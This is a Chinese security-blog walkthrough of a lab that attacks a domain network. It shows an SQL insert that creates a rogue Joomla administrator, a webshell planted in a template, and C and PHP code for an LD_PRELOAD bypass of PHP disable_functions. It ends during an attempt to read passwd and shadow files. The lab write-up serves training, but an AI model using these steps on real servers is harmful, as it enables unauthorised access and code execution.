<html>
<head>
<title>内网渗透域渗透实操ATT&CK</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
内网渗透 | 域渗透实操ATT&amp;CK
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                <span id="copyright_logo" class="rich_media_meta icon_appmsg_tag appmsg_title_tag weui-wa-hotarea">原创</span>
                                                                                            <span class="rich_media_meta rich_media_meta_text">
                                                                    Railgun
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2020-02-09</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><h2 style="text-align: center;" data-mpa-powered-by="yiban.io"><strong><span style="font-size:15px;line-height:35px;;">0x01 Build Up</span></strong></a></h2><p><strong><span style="font-size:15px;line-height:35px;;"><br  /></span></strong></p><p><span style="font-size:15px;line-height:35px;;">Goal:目标域控存在一份重要文件。</span></p><figure><img data-backh="386" data-backw="498" data-ratio="0.7730923694779116" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/1_6UJGaOMxdmuJpo8O47msb7WWh3WQvA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2zO5kviaG1XyMYEhwbe756E9jl6UJGaOMxdmuJpo8O47msb7WWh3WQvA/640?wx_fmt=png'" data-type="png" data-w="498" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /><figcaption style="text-align: center;"><span style="font-size:15px;line-height:35px;;">network</span></figcaption></figure><p><span style="font-size:15px;line-height:35px;;">建议DMZ的web双网卡：</span><span style="font-size:15px;line-height:35px;;">一个桥接一个VMnet2。</span><span style="font-size:15px;line-height:35px;;">其他的全部是VMnet2。</span></p><p><br  /></p><figure><img data-ratio="0.8778280542986425" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/2_wy74Xn8PKx1VWXgahRkTrOjzuomryg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2KYQIXOSa0Xm2JLIYVVTE5EyDwy74Xn8PKx1VWXgahRkTrOjzuomryg/640?wx_fmt=png'" data-type="png" data-w="884" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption style="text-align: center;"><span style="font-size:15px;line-height:35px;;">network配置</span></figcaption></figure><p><span style="font-size:15px;line-height:35px;;">VMnet2配置如上图。</span></p><figure><img data-ratio="0.3319615912208505" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/3_uzjibteLRgp5LK3Ayib7abtqI3dPnA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2RWoyzlg9SfI2dZYarkXf4miaPEduzjibteLRgp5LK3Ayib7abtqI3dPnA/640?wx_fmt=png'" data-type="png" data-w="729" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption style="text-align: center;"><span style="font-size:15px;line-height:35px;;">ip信息</span></figcaption></figure><p><span style="font-size:15px;line-height:35px;;">看到分配成功然后互相ping一下没问题就ok了。</span></p><p><span style="font-size:15px;line-height:35px;;">说明一下，是黑盒测试所以不提供网络拓扑，只给出DMZ的ip。</span></p><hr style="box-sizing: inherit;background-color: rgba(51, 51, 51, 0.1);border-width: 0px;border-style: initial;border-color: initial;height: 1px;margin-bottom: 1.6842em;margin-left: auto;margin-right: auto;max-width: 100px;font family: &quot;Noto Serif&quot;, serif;font-size:19px;line-height:39px;;text-align: start;white-space: normal;"  /><h2 style="text-align: center;"><strong><span style="font-size:15px;line-height:35px;;">0x02 DMZ</span></strong></h2><h3><span style="font-size:15px;line-height:35px;;">0x2.1 Admin Login</span></h3><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.50078125" data-s="300,640" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/4_umw5kTmSakK4p2XgeVobn5MaiaF5Aw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2P79MHQDvXkGE8HTianAmE7koZtumw5kTmSakK4p2XgeVobn5MaiaF5Aw/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><figure><figcaption style="text-align: center;"><span style="font-size:15px;line-height:35px;;">index</span></figcaption></figure><p><span style="font-size:15px;line-height:35px;;">可以看到Written by Joomla，探测一下目录。</span></p><p><span style="font-size:15px;line-height:35px;;"><img class="rich_pages js_insertlocalimg" data-ratio="0.565625" data-s="300,640" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/5_NHtBNXNMzKwib0b5W4RX9xQwPic1Ew.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR28go9nCuS9KpaxTBbQAmvicRhXmONHtBNXNMzKwib0b5W4RX9xQwPic1Ew/640?wx_fmt=png'" data-type="png" data-w="1280" style="text-align: center;white-space: normal;"  /></span></p><figure><figcaption style="text-align: center;"><span style="font-size:15px;line-height:35px;;">phpinfo</span></figcaption></figure><figure><img data-ratio="0.6038167938931298" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/6_ER2rXiayVlanD6lsjDFmpRzG40dfkw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2QqlzhJutHkfSCPZUiblRiaq1OJjER2rXiayVlanD6lsjDFmpRzG40dfkw/640?wx_fmt=png'" data-type="png" data-w="1310" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption style="text-align: center;"><span style="font-size:15px;line-height:35px;;">admin</span></figcaption></figure><figure><img data-ratio="0.5276752767527675" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/7_U6icTia4n0WuypKYscE3U2RWcBTAQg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2ySKdS8iaCgFptB5hBW7rHdjGYXVU6icTia4n0WuypKYscE3U2RWcBTAQg/640?wx_fmt=png'" data-type="png" data-w="813" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">这个比较有用，看看能不能远程连接一下。</span></p><figure><img data-ratio="0.8143322475570033" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/8_SHAVzfgicCWVb47DL5wdzCibfSutCQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2gic2Gy5ic6339mNkCRn0lTv43EcibSHAVzfgicCWVb47DL5wdzCibfSutCQ/640?wx_fmt=png'" data-type="png" data-w="614" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><figure><img data-ratio="0.6730158730158731" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/9_EU7qA0VH6acjtIA6IicD2K2XQic0zQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2XTenabX3ME3ubKpQUZlHbaa51YEU7qA0VH6acjtIA6IicD2K2XQic0zQ/640?wx_fmt=png'" data-type="png" data-w="630" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">看样子我们还是加一个管理员比较好,具体字段可参考官方文档或自己查看。</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="sql"><code><span class="code-snippet_outer">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">INSERT</span> <span class="code-snippet__keyword">INTO</span> <span class="code-snippet__string">`am2zu_users_users`</span></span></code><code><span class="code-snippet_outer">   (<span class="code-snippet__string">`name`</span>, <span class="code-snippet__string">`username`</span>, <span class="code-snippet__string">`password`</span>, <span class="code-snippet__string">`params`</span>, <span class="code-snippet__string">`registerDate`</span>, <span class="code-snippet__string">`lastvisitDate`</span>, <span class="code-snippet__string">`lastResetTime`</span>)</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">VALUES</span> (<span class="code-snippet__string">'Administrator2'</span>, <span class="code-snippet__string">'Railgun'</span>,</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__string">'d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199'</span>, <span class="code-snippet__string">''</span>, <span class="code-snippet__keyword">NOW</span>(), <span class="code-snippet__keyword">NOW</span>(), <span class="code-snippet__keyword">NOW</span>());</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">INSERT</span> <span class="code-snippet__keyword">INTO</span> <span class="code-snippet__string">`am2zu_users_user_usergroup_map`</span> (<span class="code-snippet__string">`user_id`</span>,<span class="code-snippet__string">`group_id`</span>)</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">VALUES</span> (<span class="code-snippet__keyword">LAST_INSERT_ID</span>(),<span class="code-snippet__string">'8'</span>);</span></code></pre></section><pre><span style="font-size:15px;line-height:35px;;"></span></pre><p><span style="font-size:15px;line-height:35px;;">注意修改表前缀，执行后即可登陆：</span><span style="font-size:15px;line-height:35px;;">Railgun secret</span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.3441033925686591" data-s="300,640" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/10_ayzNRU6p7iacqqEhORDIyvZdcU1iaA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2cVcH25T1ufpVb0H3ya4bBZRGYoayzNRU6p7iacqqEhORDIyvZdcU1iaA/640?wx_fmt=png'" data-type="png" data-w="619" style=""  /></p><h3 style="text-align: center;"><strong><span style="font-size:15px;line-height:35px;;"><br  /></span></strong></h3><h3 style="text-align: center;"><strong><span style="font-size:15px;line-height:35px;;">0x2.2 GetShell</span></strong><span style="font-size:15px;line-height:35px;;"></span></h3><p><strong><span style="font-size:15px;line-height:35px;;"><br  /></span></strong></p><p><span style="font-size:15px;line-height:35px;;">Extensions—&gt;Templates，然后选择随意一个模板进入—&gt;New File</span></p><figure><img data-ratio="0.5339987523393637" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/11_tIuh18OVsjhUpZIuEoPValEZNmoyTA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2gl0PiawGRokGsibpt7RcyQNpgMtIuh18OVsjhUpZIuEoPValEZNmoyTA/640?wx_fmt=png'" data-type="png" data-w="1603" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.45859375" data-s="300,640" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/12_QAeSicBzxQowHyPxwGibYEaMR9yKvw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2yCItLlO38OyxfVRzQ069skyqzhQAeSicBzxQowHyPxwGibYEaMR9yKvw/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="ruby"><code><span class="code-snippet_outer"><span class="code-snippet__symbol">shell:</span><span class="code-snippet__symbol">http:</span>/<span class="code-snippet__regexp">/192.168.8.150/templates</span><span class="code-snippet__regexp">/beez3/shell</span>.php</span></code></pre></section><figure><img data-ratio="0.625" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/13_VQvaOqEYcKNfsMygWlkBwtE5YlfI1Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2ibG3yLiaMRDKibEuA6aW4La0BibdVQvaOqEYcKNfsMygWlkBwtE5YlfI1Q/640?wx_fmt=png'" data-type="png" data-w="1024" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">执行不了命令，看了一下开了disable_function.</span></p><h3 style="text-align: center;"><br  /></h3><h3 style="text-align: center;"><strong><span style="font-size:15px;line-height:35px;;">0x2.3 ByPass disable_function</span></strong><span style="font-size:15px;line-height:35px;;"></span></h3><p><strong><span style="font-size:15px;line-height:35px;;"><br  /></span></strong></p><pre><span style="font-size:15px;line-height:35px;;">1、生成含有恶意代码的动态链接程序。</span><br  /><span style="font-size:15px;line-height:35px;;">2、运用putenv来设置LD_PRELOAD，优先调用我们编写的程序。</span><br  /><span style="font-size:15px;line-height:35px;;">3、通过webshell触发函数。</span><br  /></pre><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="cpp"><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">define</span> _GNU_SOURCE</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">&lt;stdlib.h&gt;</span></span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">&lt;stdio.h&gt;</span></span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">&lt;string.h&gt;</span></span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">extern</span> <span class="code-snippet__keyword">char</span>** environ;</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">int</span> <span class="code-snippet__title">geteuid</span> <span class="code-snippet__params">()</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">const</span> <span class="code-snippet__keyword">char</span>* cmdline = <span class="code-snippet__string">"ls &gt; /var/www/html/test.txt"</span>;</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">int</span> i;</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">for</span> (i = <span class="code-snippet__number">0</span>; environ[i]; ++i) {</span></code><code><span class="code-snippet_outer">            <span class="code-snippet__keyword">if</span> (<span class="code-snippet__built_in">strstr</span>(environ[i], <span class="code-snippet__string">"LD_PRELOAD"</span>)) {</span></code><code><span class="code-snippet_outer">                    environ[i][<span class="code-snippet__number">0</span>] = <span class="code-snippet__string">'\0'</span>;</span></code><code><span class="code-snippet_outer">            }</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">    system(cmdline);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code></pre></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="css"><code><span class="code-snippet_outer"><span class="code-snippet__selector-id">#gcc</span> <span class="code-snippet__selector-tag">-shared</span> <span class="code-snippet__selector-tag">-fPIC</span> <span class="code-snippet__selector-tag">libc</span><span class="code-snippet__selector-class">.c</span> <span class="code-snippet__selector-tag">-o</span> <span class="code-snippet__selector-tag">exp</span><span class="code-snippet__selector-class">.so</span></span></code></pre></section><pre><span style="font-size:15px;line-height:35px;;"></span><span style="font-size:15px;line-height:35px;;">php:</span><br  /></pre><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li></ul><pre class="code-snippet__js" data-lang="perl"><code><span class="code-snippet_outer">putenv(<span class="code-snippet__string">"LD_PRELOAD=/var/www/hacklibc.so"</span>);</span></code><code><span class="code-snippet_outer">mail(<span class="code-snippet__string">"admin@admin.com"</span>,<span class="code-snippet__string">""</span>,<span class="code-snippet__string">""</span>,<span class="code-snippet__string">""</span>,<span class="code-snippet__string">""</span>);</span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">将hacklibc.so传到服务器再通过下方php代码设置LD_PRELOAD。</span><span style="font-size:15px;line-height:35px;;">运行后/var/www/html下就会有一个test.txt。</span></p><p><span style="font-size:15px;line-height:35px;;">我们准备好链接库以及利用php，传到服务器上。</span></p><figure><img data-ratio="0.23923444976076555" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/14_DubjWA4wfcqJwK4SBl9uMEcg7kgSxg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2jLZaLy8It6fpN5Iee5TMFUeSDubjWA4wfcqJwK4SBl9uMEcg7kgSxg/640?wx_fmt=png'" data-type="png" data-w="627" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">注意该exp有三个参数：</span></p><ul style="" class="list-paddingleft-2"><li><p><span style="font-size:15px;line-height:35px;;">cmd—&gt;待执行的命令</span></p></li><li><p><span style="font-size:15px;line-height:35px;;">outpath—&gt;保存命令执行输出结果的文件路径(注意，要有读写权限的路径)</span></p></li><li><p><span style="font-size:15px;line-height:35px;;">sopath—&gt;自然是我们的lib.so了。</span></p></li></ul><p><span style="font-size:15px;line-height:35px;;">可以看到执行命令时Ok的，但是此处不考虑提权了。</span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.6985645933014354" data-s="300,640" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/15_a10qnuoz8viaRtkGh9Rl1NM5H7jdPg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2zqWQ6gmamdkX9E2yibnEbT0Rhva10qnuoz8viaRtkGh9Rl1NM5H7jdPg/640?wx_fmt=png'" data-type="png" data-w="627" style=""  /></p><p><span style="font-size:15px;line-height:35px;;">很奇怪，IP地址不对啊！</span></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><h3 style="text-align: center;"><strong><span style="font-size:15px;line-height:35px;;">0x2.4 SSH</span></strong><span style="font-size:15px;line-height:35px;;"></span></h3><p><strong><span style="font-size:15px;line-height:35px;;"><br  /></span></strong></p><p><span style="font-size:15px;line-height:35px;;">本想读出来passwd和shadow破一下密码，但是虽然passwd有权限但是shadow不可读。</span></p><figure><img data-ratio="0.4775641025641026" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/16_dY7qxkfLicggXL2t4icKoW8G9UKmPw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2cxDDYqVtWpw2U0J8hmXrFibVIMicdY7qxkfLicggXL2t4icKoW8G9UKmPw/640?wx_fmt=png'" data-type="png" data-w="624" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">这时候就要发挥取证的功底了哈哈，找到一个东西。</span></p><figure><img data-ratio="0.4338709677419355" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/17_1RmL32KPV5uDHtJXiaVsBdCjYVdLQQ.png" 